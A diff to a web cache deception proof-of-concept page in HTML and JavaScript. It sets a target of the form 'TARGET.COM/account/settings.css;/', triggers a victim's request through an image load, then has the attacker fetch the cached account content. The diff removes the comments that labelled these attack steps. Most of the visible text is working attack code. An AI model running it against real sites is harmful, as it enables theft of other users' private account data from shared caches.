@@ -14,14 +14,14 @@
 <pre id="output"></pre>
 
 <script>
-    // Replace this with your target endpoint
+  
     const TARGET = "https://TARGET.COM/account/settings.css;/";
 
     function log(msg) {
         document.getElementById("output").textContent += msg + "\n";
     }
 
-    // Step 1: victim loads the poisoned URL
+ 
     function triggerVictimRequest() {
         const img = new Image();
         img.src = TARGET + "?v=" + Date.now();
@@ -30,7 +30,7 @@
         img.onerror = () => log("[Victim] Request sent (possible cached HIT)");
     }
 
-    // Step 2: attacker fetches the cached content
+
     async function fetchCached() {
         log("[Attacker] Fetching cached content...");
 
